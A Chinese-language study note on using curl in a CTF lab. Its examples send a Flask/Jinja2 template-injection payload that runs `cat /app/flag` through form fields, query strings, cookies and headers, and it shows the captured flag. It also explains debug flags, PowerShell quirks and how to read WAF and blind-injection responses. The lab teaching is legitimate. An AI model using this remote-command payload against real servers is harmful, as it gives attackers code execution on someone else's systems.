# 16 · curl 用法（task8 靶场实操）

> 一句话：`curl` 是命令行发 HTTP 请求的工具。做题时它替代浏览器，因为**请求的每个部分（URL、方法、字段、Cookie、请求头）都能自己说了算**。

## 一、最小可用：发一个 POST 表单

```bash
curl -s -X POST "http://node5.anna.nssctf.cn:25828/level/5" \
  --data-urlencode "code={{lipsum.__globals__.os.popen(request.form.cmd).read()}}" \
  --data-urlencode "cmd=cat /app/flag"
```
```text
Hello SSTILAB{enjoy_flask_ssti}
```

拆开看：

| 部分 | 作用 |
|---|---|
| `curl` | 命令本体（Windows PowerShell 里要写 `curl.exe`，见第六节） |
| `-s` | 安静模式：不打印进度条，只留响应正文 |
| `-X POST` | 指定方法（有 `--data*` 时其实会自动变 POST，写上更清楚） |
| `"http://…"` | 目标 URL，**整条用引号包住**（URL 里可能有 `?` `&`） |
| `--data-urlencode "k=v"` | 发一个表单字段：值会被 URL 编码，多个 `--data-urlencode` 之间自动用 `&` 连接 |

## 二、两种发字段的方式

| 方式 | 写法 | 谁负责编码 | 什么时候用 |
|---|---|---|---|
| **推荐** | `--data-urlencode "k=v"` 写多个 | curl 自动编码 + 自动拼 `&` | 绝大多数情况 |
| 手工 | `--data "k=v&k2=v2"` 一整段 | **你自己** | 要精确控制编码、或要发非表单格式的 body |

手工版示例（`&` 是手写的分隔符，空格要自己写成 `+`）：

```bash
curl -s -X POST "http://…/level/5" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'code={{lipsum.__globals__.os.popen(request.form.cmd).read()}}&cmd=cat+/app/flag'
```

**表单编码规则**（手写 body 时必须遵守）：每个字段是 `名字=值`，字段间 `&` 分隔，值里的空格写 `+`，`&` 写 `%26`，`=` 写 `%3D`。

## 三、把值放不同通道（靶场常用四种）

同一个目标、同一个 flag，四种送法都能通（都在第 5 关实测过）：

| 通道 | curl 参数 | payload 里的容器 |
|---|---|---|
| 请求体字段 | `--data-urlencode "cmd=cat /app/flag"` | `request.form.cmd` |
| URL 查询串 | URL 写 `"http://…/level/5?cmd=cat+/app/flag"` | `request.args.cmd` |
| Cookie | `-b "cmd=cat /app/flag"` | `request.cookies.cmd` |
| 请求头 | `-H "cmd: cat /app/flag"` | `request.headers.cmd` |

**要点：发在哪，payload 里就要用对应的容器**。发在 Cookie 里却写 `request.form.cmd` → 取到空 → 报错。

## 四、调试三件套

| 参数 | 看到什么 | 用途 |
|---|---|---|
| `-s` | 只有响应正文 | 正常取结果 |
| `-i` | 响应头 + 正文 | 看状态码、`Set-Cookie`、`Content-Type` |
| `-v` | **完整请求与响应过程** | 排错主力：能看到实际发出的请求行、头、body |

`-v` 的输出里重点看这三段：

```text
> POST /level/5 HTTP/1.1                    ← 请求行：方法 + 路径
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 71
>
code=%7B%7B...%7D%7D&cmd=cat+%2Fapp%2Fflag  ← 实际发出的 body（编码后的样子）
< HTTP/1.1 200 OK                           ← 响应行
< Hello SSTILAB{...}                        ← 响应正文
```

**排错顺序**：先 `-v` 看请求发对没有（URL 对不对、字段名对不对、body 编码后是什么样），再看响应。

## 五、常用参数速查

| 参数 | 作用 | 备注 |
|---|---|---|
| `-s` | 安静（去进度条） | 基本都加 |
| `-i` | 显示响应头 | 看状态码 |
| `-v` | 显示详细过程 | 排错 |
| `-X POST` | 指定方法 | `--data*` 时自动是 POST |
| `--data-urlencode "k=v"` | 表单字段（自动编码） | 首选 |
| `--data "k=v&k2=v2"` | 原始 body | 自己编码 |
| `-H "头: 值"` | 加/改请求头 | 改 Content-Type、加自定义头 |
| `-b "k=v"` | 发送 Cookie | Cookie 通道 |
| `-c 文件名` | 把响应 Cookie 存文件 | 会话保持 |
| `-L` | 跟随重定向 | 有 302 时 |
| `-k` | 忽略证书错误 | 自签名 https |
| `--compressed` | 自动解压 | 响应是 gzip |
| `-m 10` | 10 秒超时 | 避免卡死 |
| `-o 文件名` | 结果写文件 | 响应很大时 |

## 六、Windows / PowerShell 的坑

| 坑 | 现象 | 解决 |
|---|---|---|
| `curl` 是别名 | Windows PowerShell 5.1 里 `curl` 指向 `Invoke-WebRequest`，参数全不兼容 | 写 **`curl.exe`**（Win10+ 自带） |
| 引号 | 双引号里 `$`、反引号会被 PowerShell 解释 | payload 一律用**单引号**包 |
| URL 里的 `?` `&` | 不加引号会被 shell 当成特殊符号 | 整条 URL 用引号包住 |
| 中文路径 | cmd 的重定向、`type` 不认中文路径与正斜杠 | 尽量用正斜杠 / 走 Python 的 `open` |
| 输出里有进度条 | 忘了 `-s` | 加 `-s` |

## 七、对照：同一件事的 requests 写法

| | curl | requests |
|---|---|---|
| 发字段 | `--data-urlencode "k=v"`（多个） | `data={"k": "v"}` |
| 查询串 | 写进 URL | `params={"k": "v"}` |
| Cookie | `-b "k=v"` | `cookies={"k": "v"}` |
| 请求头 | `-H "K: v"` | `headers={"K": "v"}` |
| 看响应正文 | 直接打印 | `r.text` |
| 看状态码 | `-i` | `r.status_code` |

**先用 curl 手动打通，再用 requests 写脚本** —— 这是最省时间的顺序。

## 八、响应判读（本靶场）

| 响应 | 含义 | 下一步 |
|---|---|---|
| `Hello <内容>` | 渲染成功，结果可见 | 拿到东西了 |
| `Hello`（空） | 渲染成功但没输出 | 检查字段有没有发对（如漏了 `code=`）、命令有没有输出 |
| `Hello WAF` | 被黑名单过滤 | 看 payload 里有没有被禁字符 |
| `No this level` | 模板报错（不是被拦） | 看字段名拼写、容器是否匹配、`cmd` 字段是否带上 |
| `correct` / `wrong` | 盲注关（只回 1 bit） | 用 oracle 提问 |

## 九、一句话总结

```bash
curl -s -X POST "地址" --data-urlencode "字段1=值1" --data-urlencode "字段2=值2"
                                └── 自动编码、自动用 & 连接 ──┘

排错：加 -v 看实际请求；换个通道就把值放 Cookie(-b) / 查询串(URL) / 请求头(-H)，
     同时把 payload 里的容器改成 request.cookies / request.args / request.headers。
```
